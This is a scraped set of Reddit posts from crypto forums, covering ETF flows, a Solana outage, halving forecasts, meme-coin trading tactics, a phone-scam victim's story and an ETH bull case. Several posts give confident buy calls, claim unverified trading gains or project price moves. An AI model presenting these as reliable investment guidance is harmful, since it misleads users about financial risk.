ibit or fbtc - nobody buying the btc via etf is going to choose the 1.5% fee option when blackrock is charging 0.12% (or 0.25% for whales) (5) just like gbtc was mostly sells (read: redemptions), i expect that ibit, fbtc, arkb, and others were mostly buys (read: creations). i have no doubt that there was intra-day swing trading (and maybe a lot... not sure) but there just aren't a lot of shares in those finds to **sell** on day 1. you would have to buy at open (or in pre-market) and then swing trade that during the day. probably some, but it's not like there was a huge glut of ibit sitting around (they had $10m worth of seed shares before they had $1b worth of volume today). (6) coinbase did $7.7billion worth of otc transactions today. (this appears to be an all-time record!) - ~$2b worth of gbtc selling - ~$2b worth of ibit, fbtc, arkb (and others) buying - ~$3.7b worth other otc transactions (other whales doing whale things) (7) how does this help us pleb investors? - if gbtc selling (redemptions) dies down, and if the other funds keep having inflows, there will be a net inflow of btc into these funds as long term holders. - this will suck up liquidity from the otc market. - as otc liquidity dries up, there is less otc for whales who want to do whale things at the current price - **number go up.** **tl;dr these etfs are whales who are doing their whale things via the otc market to avoid getting killed on slippage. also, gbtc probably had a lot of outflows today because their fees are super high.** (p.s. i'm just a regular dude who's been in crypto for a while and who tries to understand macro. if i've got stuff wrong here please tell me... but to the best of my knowledge this is correct).",1217,412,0.89,2024-01-11 22:28:03,web3,CryptoCurrency,LevitatingTurtles,False,903.9

"If Satoshi intended for Bitcoin to be a peer-to-peer electronic cash system and now is considered a store of value, does it mean it’s main goal and tech failed?",just want to preface this by saying bitcoin as an investment has been a success and has been adopted widely as a cryptocurrency. i’m not going to argue against that. i actually do see a much higher ceiling for bitcoin and see the store of value argument. in the 2010s i remember it being used for forms of payment and now in the 2020s as the price rose public sentiment changed as well. now i hear it solely being mentioned as a store of value most likely due to it’s rising transaction fees with it’s growing demand. it seems we’ve reached the point in it’s tech over time where we realized it’s usage has far outgrown the tech. satoshi probably never envisioned adoption reaching this point. do you believe it’s main goal failed? why or why not? what cryptos do you believe serve as superior forms of currency along with actual real world usage?,824,987,0.85,2024-03-25 06:42:22,web3,CryptoCurrency,Repturtle,False,897.7

Explaining the outage in simple terms by someone with an engineering background,"to preface this, i am not affiliated with the solana foundation and do not contribute to any of their projects. i hold a sizeable amount of sol. i have a computer science background and have been following discussions on twitter, discord, and github, and hope to explain the situation in non-technical terms. this may not be 100% correct, but i think my understanding is close. feel free to correct and i can update if necessary. &#x200b; 1 why did the network slow down? a bot began spamming the network and hit a peak of 400k tps. when a validator realizes it is lagging behind the leader, it will forward transactions to the next leader, who will now have to handle it's own normal messages and the backlog that's been pushed to it ([source](https://twitter.com/buffalu__/status/1437792673784549383)). this high volume of transactions both takes down some validators because they don't have enough compute resources and also buries network-critical messages from being processed ([source](https://twitter.com/solanastatus/status/1437856638279487493)). on a technical level, the network is still up -- it's just that nothing important is being processed ([grafana dashboard](https://metrics.solana.com:3000/d/monitor-beta/cluster-telemetry-beta?orgid=2&var-datasource=solana+metrics+%28read-only%29&var-testnet=mainnet-beta&var-hostid=all&from=now-5m&to=now&refresh=10s), this tracks live data, so will eventually be otudated). 2 solana is centralized and the foundation flipped some type of backdoor switch to shutdown the network (this is false). it's fair to say that solana is more centralized than ethereum. however, saying the foundation has the ability to unilaterally shutdown the network is simply false. as noted above, the network was disrupted by a third-party attack and just slowed down to 0. some validators crashed on their own. some validator managers may have also disconnected their own nodes. however, nobody at the foundation has the power to click a button and disconnect a node. with everything open source on github, feel free to go through the code and check there's no backdoor. the one bad thing is that the only people who actively develop code to connect to the network (these are called clients) is the foundation. eth has maturated so that there are several independent clients that are quite popular (i.e. geth and parity). hopefully solana will get there one day. 3 what's the solution? a [patch](https://github.com/solana-labs/solana/releases/v1.6.24) was released. the [basic solution](https://github.com/solana-labs/solana/pull/19834) seems to just set a limit to how much can be forwarded when a node gets behind. unsure of if i'm dumbing it down too much, it's just a band-aid solution, or it will impact the speed of the network. 4 when will the solution be deployed? the patch is out and validators are upgrading as i type. to restart the network, 80% of the stake must be online and accept a restart. currently, \~50% of stake is up and signaling they are ready for restart. this process demonstrates that the team cannot just choose to turn the network on. instead, each individual validator must make their own decision, which is what decentralization is.",709,1138,0.95,2021-09-14 18:46:09,web3,solana,loinj,False,890.1

You sold everything. remember? Crypto mixed with FIRE,"i have seen the following-for reference i'm 40: a guy make a million dollars in 2020 then gamble his family's home away (even though it also had a million of equity) my close friend sell his btc and eth near the bottom, but decide to rent a luxury apartment (his parents live in the same city). 35, no assets now. my og friend buy 3 btc at $2,000 each, only to sell them at $8,000. can never get to that level again. me: sell my condo with a $550/mortgage and $400 month positive cash flow because i had too much debt, only to see the property +90% since then (2020). can never get that investment again. if you are heavy into crypto, you most likely have a longer term time horizon, an idea of delayed gratification, and long term investing. however, you are also more likely to see huge gains and wealth at a relatively young age. i think this is a very difficult thing to deal with (first world problems). however, it is an issue. i highly encourage you to tell no one about your crypto. no one. your wife will want to spend it, your boss will hate that you are wealthier than him (who knows, maybe he panic sold), your friends will envy you. it is the natural course. if you need to tell someone, tell them you have 10% of what you actually have. i have no problems with ferraris and rolexes-but please, for the love of god, protect yourself. get a small house. get solar. get a small electric car. you have no car bill, no electric bill, no fuel bill, no house bill. you have unlocked freedom. in fact, you can now easily invest in crashes because you don't need to be short term oriented. keep your w2 job. even if you work in a crazy, dysfunctional environment. i know a guy who walked away out of pride from a job that could have made him easily $6,000 a month. he lived with parents. he wasn't a spender. imagine after taxes dca'ing $3500-4000 a month. for the last 4 years. keep your ego in check. this isn't just relative to crypto. the easiest way to get wealthy is to not wash out. i know many men who during most of their life made very, very good incomes but leveraged themselves up. they had to restart their entire financial life after 2008. for those in crypto, i know someone who had to restart their financial life after 2017, then again in april 2020. please for the love of all that is holy stay away from leveraged trading. p.s. i know a guy who put $2,500 in to dogecoin and it was worth $750k at the top. i own doge. what shocks me is he didn't take at least 100-200k to buy a house.",1074,481,0.88,2024-03-07 12:04:13,web3,CryptoCurrency,Tryingtodoit23,False,845.5999999999999

I analyzed the Last 3 Bitcoin halvings here's what I think will happen after the 2024 halving,"hi if you've never experienced a bitcoin halving before, or if you have but are unsure what to expect, i've done a bit of research based on the last halvings. here's what i have. the halving occurs every four years, cutting the reward for mining new blocks in half. the next halving will reduce rewards from 6.25 to 3.125 btc. historical price impacts: * 2012 halving: bitcoin's price surged approximately 9308% in 13 months. * 2016 halving: saw a 2861% increase over 17 months. * 2020 halving: resulted in a 620% increase in 11 months. based on some napkin math the btc can reach a 162% price increase post-halving, with the peak expected around 420 days (14 months). inb4 no one knows shit about anything. it's a probability game. what's your take. here's the [article](https://onchainedge.beehiiv.com/p/the-bitcoin-halving-2024-not-priced-in) and i also made a [video version](https://youtu.be/o9hce0_nrgy) you can watch.",927,547,0.85,2024-03-24 23:51:18,web3,CryptoCurrency,xtarsy,False,783.5

We've gotta talk about Republicans and crypto,"tl;dr: don't vote based on your bags. republicans aren't the crypto boosters everyone makes them out to be, and the way trump has used crypto as a grift to make money just reinforces existing stereotypes about crypto being scammy. i know, i know. we're all saturated with politics and election crap right now and we're tired of it. me too. but i hear the idea that ""republicans are the pro-crypto party"" all the time and it's just not true. https://preview.redd.it/e9aor4poqyyd1.png?width=1196&format=png&auto=webp&s=f9d39dea07e453748665ef5d8328094120fbb031 first, republicans aren't uniformly supportive of crypto and democrats aren't uniformly against it. my no-talent ass clown of a senator (roger marshall) is a hardcore maga republican but wildly anti-crypto. he called crypto a [""threat to our national security""](https://www.marshall.senate.gov/newsroom/press-releases/sen-marshall-cryptocurrency-is-a-threat-to-our-national-security/) and co-sponsored a bill with elizabeth warren to make stricter aml/kyc regulations. during the ftx debacle he even suggested that the sec [shut down all crypto transactions in the us](https://www.semafor.com/article/12/02/2022/roger-marshall-kansas). saying that democrats aren't supportive of crypto isn't true either. when you look at the list of [congressional candidates endorsed by stand with crypto](https://www.standwithcrypto.org/races/endorsed), half of them (19/39) are democrats. not to mention that democrats incorporated some crypto-supportive events into the [dnc convention](https://www.coindesk.com/opinion/2024/09/24/how-democrats-have-shifted-on-crypto/) and [anthony scaramucci has reportedly been working with kamala harris](https://www.cnbc.com/2024/09/20/anthony-scaramucci-kamala-harris-campaigns-digital-asset-policies-.html) to develop pro-crypto policies. saying republicans are the more crypto-supportive party may have been true 5 years ago, but that has changed. secondly, we've got to talk about trump. saying that trump is pro-crypto is like saying a bank robber is pro-unmarked bills. [his recent ""pro-crypto"" turn](https://www.axios.com/2024/05/30/trump-crypto-bitcoin-nfts) is at best a flip-flop and at worst a grift. in 2019 he said that [bitcoin was ""based on thin air""](https://x.com/realdonaldtrump/status/1149472282584072192?lang=en) and as recently as [december of 2021](https://decrypt.co/89108/donald-trump-calls-crypto-dangerous-even-as-melania-launches-nft), he called crypto ""dangerous"" and a ""scam.""

Set your sell limits NOW,"if you are “investing” in crypto with a goal in mind (amount you need for house, other investment, debt relief, etc) spending the time now to do the math, and set yr sells up now. i’ve been through multiple bull runs, and every time the greed + excitement has gotten me to hodl just a “little bit longer” when the numbers hit what i was looking for, so i didn’t sell, then things crashed, resulting in less profit overall. this is embarrassing - i’m not ‘bragging’ about making the same mistake multiple times - but hopefully someone can learn and profit off my bumbles. good luck all. edit: some of y’all really need reading comprehension skills. i am not saying sell now, i’m saying set up a goal for when to sell (whether it is amount or date)and think about why you would sell. i’ve held btc for about 10 years and eth since low double-digits, but thanks to all who’ve criticized my paper-hands and lack of understanding. i haven’t posted here in a long time and you’ve reminded me why. and for those who will never sell - if you just want to “collect” stuff, comics and coins are cheaper. for those who want to enjoy life and do something with yr gainz, start getting used to the fact that you’ll eventually have to sell. if you don’t, you’ve got jack shit but an intangible binary claim. have fun, enjoy the ride, and don’t risk more than you can stand to lose. much love.",880,471,0.86,2024-11-10 11:53:28,web3,CryptoCurrency,UWphoto,False,725.0

Greyscale just moved another 760 million worth of BTC to Coinbase. With their monster stack of 525k BTC can they prevent a bull market in 2024? Why do they keep selling on Coinbase instead of OTC?,"if greyscale’s investors(customers) decided to own 0 gbtc they can literally keep bringing the price down, wait for 40k btc, sell a billion, bring it down to 35k-30k btc, wait one week for the price to recover, sell again at 40k. they can keep doing this for quite a long period of time, this can keep going even after the btc halving. there is not enough purchase power to absorb 1 billion worth of btc sold weekly (at 40k$). that's literally 21 billion worth of btc(525k x 40k). that's 5 months selling a billion worth of btc each week at 40k. i'm also curious why aren't they selling otc? aren't there some laws for that? selling spot on coinbase every time absolutely kills the market. who has interest to keep btc low? are they helping blackrock and the others to acquire cheap btc as much as possible? what's the idea here? honestly i feel if greyscale stopped selling for a month btc would go 50k + instantly. what do you guys think about this?",841,525,0.86,2024-01-24 13:32:01,web3,CryptoCurrency,gen66,False,723.1999999999999

How I went from 1000 > 200k so far this run,"you are responsible for yourself, i am simply sharing my experience. not financial advice. use ai to summarize. if you guys can’t even do that and comment that it’s too long you aren’t the types of people that are going to make any gains, i’m sorry. i am likely missing a lot of things as i wrote this in a rush, please ask questions below, i will answer everything. **background:** * i've been on this sub for a while now and the quality in general is just very low. there is a lot of mis information and amateurs that have been in crypto for a few months giving their opinions on things they don't understand and receiving upvotes for it. this is my attempt to help fix the problem by creating an all inclusive guide that will hopefully answer most questions people commonly ask. * this is currently my third crypto run, i did not have much money to invest in the previous runs but i still did make massive returns which i ended up losing due to exchange hacks. this allowed me to learn many valuable lessons which i will pass on to you guys. * aside from crypto, i invest in real estate and the stock market, both have also been very successful with over 2000% returns in 5 years. i like to think i am decently well rounded when it comes to investing and while luck plays a big part i think i also have a proven track record at this point. my crypto gains on the other hand was not from one play but hundreds of plays over a few months. **generic investing advice (probably have heard these before):** * don't invest more than you are willing to lose. * pay off debts first and do not go into more debt so you have money to invest with. * do not become an emotional investor. have a plan and stick to it unless the conditions have changed. think of an entry and exit strategy beforehand. * crypto is especially risky and volatile, you need to be able to stomach 50% drops like we had the past few weeks for alt coins. * always keep up to date on current events. things like the war in the middle east have a massive impact on all markets weather you like it or not. if you had been paying attention, we knew ahead of time the attacks were going to happen and you could of moved things to stable coins. * getting in early is extremely important. the earlier you are able to get into something the more you can make. even if you make the wrong play, if you were early enough you can still exit with a profit or minimize losses. this of course comes with more risk as well but there are ways to minimize it as i will mention later on. * research the latest things and trends. for example, before things like chatgpt got popular i was already aware of gpt2 and gpt3 which at the time no one heard of. this allowed me to get into multiple ai investments early on for low prices as i knew of these things before anyone else and saw the potential. similarly, i have invested in a few ai coins as i know that is one of the main trends this time. some previous trends include things like defi, gaming, nfts, rwas, and more. you just need to see where the hype is going and invest accordingly. **generic crypto advice (probably have heard these before):** * do not store coins on an exchange. * do not ever give out your private key and do not connect your wallet to random sites. * most airdrops are fake, be very careful. * if you are holding a coin and the price impact is very high, it has already been rugged. * i recommend using jupiter to make trades. it is the most reliable and now supports new coins. * if your transaction is not going through, increase the priority fee. **information on crypto:** * most crypto coins are based on block chain technology which allows for decentralized person to person transactions. this allows anyone to send transactions anonymously to anyone for a very low fee and quickly. coins will typically make use of miners (other methods exist also such as proof of stake) to process the transactions and they will receive a fee in return. * while block chain technology is very interesting, it is not as revolutionary as you think. it is niche and for very specific use cases. therefore, 99.99% of the coins currently available are not needed at all and this includes a vast majority of the top 100. there is no such thing as ""utility"" projects and whatever else people like to call it, they aren't needed. treat crypto for what it is, an investment and a way to make money based on hype. this will be a hard fact for people to swallow but will prevent you from getting married to projects based on their ""use"" cases. * the crypto market is almost entirely driven by bitcoin and its different cycles. in the past, bitcoin tends to start increasing before and after the halving where the rewards for miners get cut in half. then the price starts crashing 60-70% around a year or so after the halving. all other coins will follow a similar pattern with a few exceptions. * bitcoin itself is now heavily tied to the stock market. go overlay the performance of bitcoin against the s and p 500 and you will see an almost exact overlap. therefore, most of the time the stock market will be determining where the price of bitcoin will be heading. all previous runs have been in times where the stock market was doing well but this time may be different as interest rates are going to stay elevated for longer and inflation is having trouble coming down. we will see if bitcoin will follow the downtrend of the stock market or eventually go on its own. i believe in the short term it follows it but eventually we see the affects of the halving and it begins to diverge, but it may take a while. **shitcoin trading:** * pretty much the reason i made this post. this sub seems to be against the idea of trading shitcoins and making money off of them. this sub needs to realize the reason solana is doing so well this run is because of the shitcoin trading. like it or not, its the main use case for this chain and what most people use it for, bringing in billions of dollars of volume. * the money i've made from this run has been made entirely on shitcoins. i do not follow any influencers or look at calls. i do my own research. * of course there is a lot of risk involved. devs can rug the coin by pulling out the liquidity or sniping their own coin at launch and dumping all at once. freeze authority can be used so no one is able to sell. and the many other methods that exist for rugging a coin. * here is my method (when i used to trade shit coins, things are much harder now so i don't really bother anymore). i scan for new coins on dexscreener using a variety of filters. i like to focus on volume as it seems to be a very good indicator for how coins will end up. i set liquidity to 500, mcap to 5000 - 1000000, 5m buys to 50, 5m volume to 5000, and 5m change to 5. this will filter out 95% of the new coins that come out including most of the rug pulls as they tend to follow similar patterns. now with the remaining few coins that are left you can perform individual research on them. look at the chart, and top traders. if it looks suspicious in any way do not buy in. for example, the chart has a giant green candle in the start and dumped afterwards, this is a sign of sniping or bots. if the top traders are all under 1$ of profit it means there's multiple bot accounts pushing fake volume. if the chart looks unnatural it means the dev is pumping the price and will dump on you. most of this comes with experience and you will start to understand the warning signs as you get better. i suggest not even trading at first and just watch and see what happens to most of these coins so you can gain some experience. next put the ca into a tool like rug checker. it will give you a good starting point. you can see if the contract is renounced or if the liquidity is burned. most new coins wont have either but these things will happen within a few minutes. if you really want to be early you need to take the risk sometimes but i understand if you want to wait. i usually do not wait and i rarely ever get rugged because you gain intuition with experience and know when a coin is likely to rug or not. from there you should go on the website and telegram to gather more information and see what is going on. then look at the block chain, first checker the owners address and see how many coins they are holding or if they transferred a large amount of coins to many wallets. if that is the case, it will usually rug. the devs can also snipe the coin at launch, to check for that you need to see the transactions on dexscreener and go all the way to the beginning. you can sort the transactions that are over 0.5 or 1 sol as it will usually be a large amount. now these methods are not fool proof and you will still get rugged but you have reduced the likely hood of it happening by a large amount. doing this gave me around a 95% success rate in not getting rugged. also, you need to do all this within one minute or it is already too late for a good entry. * just because a coin is not a rug does not mean it wont get dumped. a coin can still go down 80-90% legitimately. this is where you need to come up with an entry and exit plan. a good way to tell is, is it a good meme, does it have a lot of volume, is the volume increasing, is the telegram active, is the website built nicely, are they spending money on marketing such as trending, has the dev made coins before, does he have connections, etc. decide weather or not it is a quick trade or you will hold. for example, you get in at 10k mcap, some coins will go to 15k and die or go beyond 1m. you need to figure out which type of coin it is going to be, and like i have mentioned alot, experience will help with that. * most of my trade have been quick trade, i make a 20-30% then move onto the next shit coin. i was getting consistent profits with this as there is not shortage of new coins. however, this wont be enough to make up for the losses you will incur as well. most gains will come from those coins that go up massively and it is very important for you to ride that as long as you can. i will give three examples. i got into a shitcoin early where the dev was sleeping live in twitter. this is not something i saw before and the live stream starting blowing up with thousands of viewers. at the time it was still low mcap and i would have normally fipped it quickly, but due to those factors i knew it would be something special. sure enough, it went past 1m mcap and i made 40x my investment. another example is the coin that started the presale trend. i did not get in so early on this but i saw the volume this coin had and it was unlike anything else. i believe it was around 100m volume in only 30 minutes. i put a lot of solana into that as i saw the potential and made around 10x. i have made bigger percentage gains before but due to the large amount i put in i made a huge profit. lastly, i got early into a coin and joined the telegram. i saw how dedicated the dev was in ensuring the coin was safe and growing naturally. he put in 100k of his own money and burned it and audited the contract. from there he worked every single day to make real partnerships and hold various community events. i decided to hold that for a long time and made over 100x return. * while i am talking about solana mainly, look into other chains as well. i have been trading on base now as it feels like how solana was very early on. i have been making much more consistent gains on that lately while on solana things have gotten much harder due to the amount of bots and rug pulls. its important to follow where the trend is. **the hidden side of trading:** * i'm sure many of you know that trading is manipulated and i am here to give confirmation to that. * there are sniper groups and other ""cabals"" that tend to be the ones behind most of the popular coins you see. this was not as much of an issue before but it has turned into a bigger issue now. * these guys are making use of tools that cost hundreds of thousands of dollars to buy things before anyone else and dump on them, for example peppermints sniper bot and deez nodes. this is a setup that allows these snipers to be the very first transaction. on a popular presale, one of these snipers spent 50k in transaction fees to be the first transaction and spent 1 million to buy coins and sold it only a few seconds later for 10 million. * these groups will also work with influencers and other people with a large following to push their coins. a lot of the popular influencers you see are being paid by these people to push their coins. they also sell insider information which you can spend thousands a week to get in on their launches early which could result in alot of profit. **what i did this run:** * started trading shitcoins in december. once i made it to 5 digits i started to focused on shitcoins with longer term outlooks (but still small mcap). now that i am at 6 digits, i am focusing on coins with much larger mcaps such as jupiter and staking my coins. i have 10k set aside to continue to trade shit coins with, half is in solana and the other half is in base. as you can see, its important to change your strategy as things change. * i believe bitcoin can do 2-3x more from here, but not anymore than that. each run sees diminishing returns and you are being greedy to expect more. solana will also unlikely hit 1000$ like i've been seeing on this sub but anything can happen. think of solana as a leverage play, where if bitcoin goes up 100% solana will go up 150%. and the major coins on the solana network are leveraged on top of that where if solana goes up 150% those coins will go up 200%. * my biggest mistakes this run were getting too greedy and not following my plans. this has been an issue for me every run but this run its not nearly as bad. i had 230k in bome and i knew once the binance listing was finished it would tank as it does for every coin that gets listed on there. however, after it got listed it continued to go up and i thought maybe this time is different and i held. of course the price crashed as i expected and that 270k turned into 130k, a loss of almost 100k profit in only a few hours. of course i still profited massively, but i did not stick to my plans and let emotion take over and that resulted in a major mistake. once again, you can see why research is such a powerful thing, i knew ahead of time this dump would happen because i looked at the last 20 coins listed on binance and noticed that those coins always dumped after it got listed. if you want to make money these are the types of things you need to do. you need to be investing actively and always do research.",795,529,0.89,2024-04-27 15:27:29,web3,solana,FinalSir3729,False,697.5
It's My Own Fault I Got Ripped Off,"30 minutes ago i got a call from coinbase stating i was involved in a data breach from turbo tax. it was from an automated robo call. about 30 seconds later guy calls, and explains i'm involved in a data breach. he says my account was compromised and that i needed to transfer funds to my wallet. i'm so f\*\*cking stupid i fell for it. it took almost a half hour to go through the process, and i was dumb enough to go through the entire transaction before getting suspicious. the got the eth, nothing else. it wasn't that much, about $300 and change, but that isn't the point. thank god i didn't have anymore in there, and luckily when they started having me go through the rest of the assets i started to get wise. and of course that's when the call was disconnected. i can say it's losing the money that upsets me, but that isn't it. it's my stupidity and lack of paying attention. i'm 66. i'm old. probably too old to be messing with this stuff. i'm lucky i haven't been messing with my crypto for quite a while so the funds are just minimal to keep the account active and open. i'm sick to my stomach that i was duped. just had to share and get this off my chest. it's been years since i've been ripped off for anything, like 20 or more. it sucks getting old and being foolish, i'd say it's because i'm female, but even that can't be used as an excuse. i won't stop beating myself up over this for a long time. caveat emptor, folks.",863,425,0.91,2024-04-16 21:07:46,web3,CryptoCurrency,Thick-Resident8865,False,696.9

5. track dust - use blockchain tracing tools like etherscan to verify all of your on-chain txns. before sending any large funds make sure there isn't any address poisoning attempts on your own wallet. stay safe out there and i do hope the victim gets his funds back. **update 1** a victim has been found. all funds are still sitting in decentralized wallets. if i were the hacker i'd take the offer of 10% and walk away with 7 million!

Today is a day to remember for me,"my journey in the crypto world began back in august 2021. as most of you know that was pretty much the peak of the bull run. about every coin that i bought was damn near at its ath. i was watching videos about : ada reaching $10 ( i bought just below $3 ) link reaching $100 ( bought just below $50 ) dot reaching $100 ( bought just below 40 ). there were a few others but those were the most talked about at the time. i would say about a week later everything started to drop. i was just coming over from the wallstreet bets tiger blood hopium that was the gamestop and amc whirlwind. i was kind of used to market volatility. the money i had made off that is what i used to invest in crypto. i knew nothing of the crypto world! my account just kept dropping, and dropping and dropping. i didnt invest anything until about 6 months later. i was defeated. i never sold!!!! now im not some big time investor. i only had about 2k invest total, so i was not completely devastated. i was about 90% down at the worst. around $300 total. again i didnt invest to much, so i wasnt to stressed. thats when i started to research and learn about crypto. over the course of the past almost 2 years, i have been dca down on the coins i held the whole time. i opened up a few new positions on coins that i feel could be promising and thats where i mostly put my money. i am a single father, paying for my daughters daycare. and i live in south florida. those of you know, know how much that shit cost. i put what i could into my investments. i met goals, and i pushed the line even further. i sacrificed certain liberties in my life in hopes of what the future could hold. i am fully aware of the risk / reward that is at hand. high risk, high reward. thats the crypto world. i dont expext to make $1 million off of a $1k investment. i am aiming for a realistic goal, say $50k - $100k ( if things really pop off !) today is the first time in my crypto history that i am finally positive!!! i cant fucking believe it! my portfolio is finally in the positive! i had my doubts. i had my moments where i wanted to cash out and just give up. my account has grown and grown and grown over the past month. the only coin that was really exploded for me has been link. all other coins have been say sub 10% - 15% gains. it brings life back to me. it brings hope, it brings a smile to my face, it brings excitement. &#x200b; tonight i cracked open my special whiskey ( stagg ), and i pour it for myself and for all of you! i hope your journey has led you down the same path and i wish all of you the same fortune! may the next year or so bring us all fortune and spoils! cheers!!!!",802,212,0.92,2023-12-08 22:13:44,web3,CryptoCurrency,bry578,False,575.2

The Ethereum Value Proposition: Dark Horse Edition,"if you’ve been in this sub for years, you may remember a series of posts here dubbed “ethereum value proposition” back in 2021 by yours truly during an epic eth fud campaign before eth went on its face ripping rally. check the receipts, i did a multi week series in mid march 2021 and days later eth made the face melting gains 3x and up. why am i telling you this? to toot my own horn? no. it’s because the reason i made those posts years ago was because the market was being highly irrational toward eth and i believe it is doing it again, and where irrationality exists, opportunity for gains exists as well. if you’ve had a pulse in crypto the last 3-6 months you’ll know everyone and their mom has turned bearish on eth. in 2021 the criticism was “eth cant scale”, now it’s “eth is ded” nonsense. and here’s why: tradfi has quickly realized that the megalithic opportunity in crypto is stablecoins (see https://x.com/nic__carter/status/1857408855719674075). as you can see stablecoin volume has skyrocketed in the last 4 years eclipsing paypal, bitcoin, remittances, and almost approaching the levels of visa, the largest payment processor in the world. guess where the vast majority of stablecoin volume happens? yep ethereum and it’s l2s. over 70%. “oh but eth l1 has no usage no one uses it or oh it’s l2s are dead bla bla bla.” no, eth has significantly scaled by introducing “blobs” a few months back. check l2beat, ethereum and its l2s users and transactions are near all time highs for an aggregate of ~370 tps currently. source: https://l2beat.com/scaling/activity “oh ok so some people use eth big deal, but it’s still not a good investment” if that were true,why then while everyone and their mom has been fudding eth, blackrock, (the largest hedge fund in the world)in the last 2 months has increased it’s holdings of eth in its etfs by a whopping 65%? source: https://x.com/ethereanvibin/status/1858254969389863290 why is over 95% of blackrocks “buidl” fund of over 500 million dollars built on ethereum? why are states like florida and michigan starting to acquire eth? florida now holds over 800 million in crypto related investments and michigan 11 million: https://www.ccn.com/news/crypto/michigan-largest-ethereum-etf-holders-us/ “oh but bitcoin is the only scarce asset with real value for holders, everything else is just a scam or gambling” since proof of stake and the burn was implemented about 3 years ago eth has had half the inflation rate of bitcoin: https://ultrasound.money/ in laymen’s terms, bitcoin is being printed at twice the rate of eth. people literally do not realize this. this is beyond significant. michael saylor himself, the bitcoin messiah has said that bitcoin has to figure out a way to generate yield, because just holding it long term is not economically feasible, direct quote: “the point is if the capital doesnt generate a return its a non performing asset, you need to address the issue. if i put $100b into $btc and the yield is 0%, thats just as bad as having $100b bonds that pay 0% yield. in both cases theyre non performing"" source: https://x.com/etheraider/status/1836493170772971646 what this means is that saylor fully recognizes that yield is king. everyone knows that stocks that provide quality yield command a premium, you don’t think crypto assets will command the same premium anon? but don’t confuse yield with inflation, yield comes from “activity/mev/fees”, because if you have high yield due to inflation and not from actual usage of the chain, then your yield will be high but so will the inflation of your coin so you never come out ahead. and what chain has the purest native premium on yield? the one with the most activity/mev/fees relative to its inflation, in other words ethereum. saylor for a long time discredited eth because he said it was a security. now it officially is not. he now says he wants a “form of bitcoin” aka a scarce asset that gives him yield….. you do the math. saylor may never capitulate and buy eth due to pride or maybe because he’s built a religious cult following and attack the fragility of bitcoin maximalism by holding another asset but that doesn’t mean you have to repeat his mistake. is eth the best asset in crypto? no, there’s no way i can make that claim about any asset without being biased or disingenuous. is it one of the best risk adjusted reward plays right now given history, tech, present social bias, and network effect? absolutely. i could go on and on about how eth has always outperformed btc in bull cycles, how the weekly rsi is at all time historic lows and therefore represents a legendary buying opp, etc etc but i’ll end with this: 3 years ago the level of fud surrounding eth is what prompted me to post this series because it was so over the top irrational. the same pattern is repeating now. if you listened then and did the counter trade congrats. if you didn’t, here’s your second chance don’t fall for the ct fud doomloop. eth is the dark horse this cycle. load up, you won’t regret it.",620,371,0.93,2024-11-18 09:45:15,web3,CryptoCurrency,etheraider,False,529.6999999999999

"Thanks to CEX delisting, we have now at least 3 atomic swap implementations for Monero.","since okx has turbo delisted monero and binance is in the process of delisting it, the question for on- and off ramps for monero became more pressing. so far the only bullet proof methods have been: * bisq * localmonero/agoradesk * and btc/eth atomic swaps but because high fees make the process of decentralized exchange cumbersome with both eth and btc most traffic so far went to localmonero. which in itself is a good solution, but a centralized website lacks the robustness of a dex like bisq or trustlessness of atomic swaps. therefore it's nice to see that both ltc and bch as low fee alternatives have picked up the topic and bch in the meanwhile delivered a functional poc for a third major atomic swap implementation between bch <>xmr. _____ we now have at least three atomic swaps implementations for btc https://github.com/comit-network/xmr-btc-swap eth https://github.com/athanorlabs/atomic-swap bch https://github.com/phcitizen/bch-xmr-swap?tab=readme-ov-file#bch-xmr-swap-poc the next milestones will be bisq2, haveno and seraidex and for those interested in a deeper integration of the last atomic swap implementation there is a community funded project here: https://atomic-flip.pat.mn/en",826,46,0.94,2024-01-07 12:08:37,web3,CryptoCurrency,gr8ful4,False,523.4
What does it takes to earn $100k from NFT art? Insights from crunching the data.,"i crunched the data on 100 artists who have earned $100k-$199k revenue in nft sales to find out what they were creating, where they were selling and what scale of audience they had. here are five key insights i found: &#x200b; 1. the most popular artistic medium amongst the $100k club is animated 2d with **31.2%** of creators using this format. 2d art without animation is a close second at **28.6%**, followed by animated 3d at **24.7%** and static 3d at **15.6%**. [https://media.giphy.com/media/pjysjeak3mri4/giphy.gif](https://media.giphy.com/media/pjysjeak3mri4/giphy.gif) &#x200b; 2. more than half of the artists $100k club sell on more than one platform, the average being two. [**superrare**](https://superrare.co/) was the most popular amongst the sample group followed closely by [**makersplace**](https://makersplace.com/). [https://media.giphy.com/media/l0myvojkbieb0zjtq/giphy.gif](https://media.giphy.com/media/l0myvojkbieb0zjtq/giphy.gif) &#x200b; 3. the median average sale price of nfts by artists in the $100k club is **1.033 eth ($1,835.69 as of today)**. [https://media.giphy.com/media/67thrzlybvibtdf9jh/giphy.gif](https://media.giphy.com/media/67thrzlybvibtdf9jh/giphy.gif) &#x200b; 4. the average number of artworks sold by nft the artists in the sample group is **114**. [https://media.giphy.com/media/fxiflug6rucvo/giphy.gif](https://media.giphy.com/media/fxiflug6rucvo/giphy.gif) &#x200b; 5. how big of an audience do you need to build to make $100k as an nft artist? the answer isn't as large as you'd think. artists in the $100k club who use twitter have an median audience size of **2,032**. also, having a larger audience did not necessarily mean that artists could achieve a higher sales price per nft. as the plot below shows having a significantly bigger audience did not have a proportionate effect on average sales price. artists with smaller and perhaps more engaged audiences earned just as much, if not more, from each nft as their more popular counterparts.

""but meme coins are stupid and serve no purpose, i only buy ""serious"" projects. news flash. the alt coin you've been holding for 5 years is just as useless as elonbadgercoq on trader joe's. it's done nothing. the team has accomplished nothing. you know this and still try to justify your investment so you can separate yourself from the degen gamblers buying cat tokens on some dex. i don't care how many transactions it can do or the speed of finality or what company is rumored to have plans to use it. its the same meme coin hype shit, just a smaller scale. yes, some projects will pump in the next year. yes, some projects are genuinely good with great developers making amazing tech. but most of the alts you're buying and holding with the expectation of past price action will not return to aths. price aside, whatever goals on your teams roadmap mean fuck all. there's not that many problems a speculative token fueled blockchain can fix that some traditional network can't do better, faster and cheaper. no major publicly sold company cares about how decentralized something is. downvote me all you want. i know you really care about whatever eth killer youve been stacking and holding. some of you will get lucky and i hope you do. but for most, its not happening. the reason why meme coins are so popular is because it's the streamlined, super fast paced version of the entire crypto market. it's the final format. a launch, a bunch of hype, the coin bleeds out, some people make some money, most lose. the coin drops close to 0 with all the bag holders claiming it will return to where it was. rinse lather and repeat.",505,496,0.68,2024-10-26 05:24:18,web3,CryptoCurrency,JohnTitorAlt,False,508.2

